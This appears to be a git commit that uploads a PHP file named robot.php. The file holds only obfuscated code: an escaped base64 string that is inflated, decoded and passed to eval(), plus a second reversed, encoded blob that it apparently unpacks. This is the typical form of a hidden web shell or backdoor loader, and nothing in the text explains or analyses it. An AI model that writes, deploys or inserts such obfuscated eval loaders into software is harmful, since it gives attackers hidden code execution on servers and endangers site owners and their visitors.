c8a03529d462c7ef7f7d0483a5ba7533fa1462cb
ohctcombet <154842409+ohctcombet@users.noreply.github.com>
2024-02-21 04:27:07 +0700

    Add files via upload

---
+++ robot.php
@@ -0,0 +1,6 @@
+<?php
+$Cyto = "Sy1LzNFQKyzNL7G2V0svsYYw9YpLiuKL8ksMjTXSqzLz0nISS1K\x42rNK85Pz\x63gqLU4mLq\x43\x43\x63lFqe\x61m\x63Snp\x43\x62np6Rq\x41O0sSi3TUPHJrNBE\x41tY\x41";
+$Lix = "\x3d\x3dwl\x41hnShojU3\x433Ms\x42ptrEv1\x41wvwRu/6\x42Gv4t9FyX3Sz5/6\x41\x42P1/\x42jVsk\x2b1T\x62rwrY2Lt\x416\x63dxqREiYZKytue/\x2b0IzuQnfPi0TYRks\x41ppy/9TORkjuQ\x61K\x619\x42\x42xF0Risg3g\x41WmYtK0Fw\x41MD6QMF3w/j\x43\x41X\x42wJe/jJ\x41nFw/T\x43\x41\x62\x42wJe/jI\x413Fw/D\x43\x41f\x42wJe/jH\x41HGw/z\x42\x41j\x42wJe";
+eval(htmlspecialchars_decode(gzinflate(base64_decode($Cyto))));
+exit;
+?>
